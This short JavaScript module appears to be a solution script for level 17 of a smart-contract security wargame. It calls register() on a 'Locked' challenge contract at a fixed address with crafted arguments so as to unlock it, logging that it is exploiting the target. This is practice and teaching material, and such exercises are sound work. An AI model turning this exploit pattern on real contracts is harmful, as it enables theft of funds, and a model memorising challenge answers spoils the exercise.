const level17 = async (Locked) => {

    const targetAddress = '0x4197ce63d62ec672ea729d4e528dbd6bd730281c';
    console.log(`Exploiting Level17 target ${targetAddress}...`);

    console.log('Retrieving target contract...');
    const target = await Locked.at(targetAddress);

    console.log('Unlocking the contract...');
    await target.register(Array(32).fill(1), '0x1122334455667788990011223344556677889900');
};

module.exports = level17;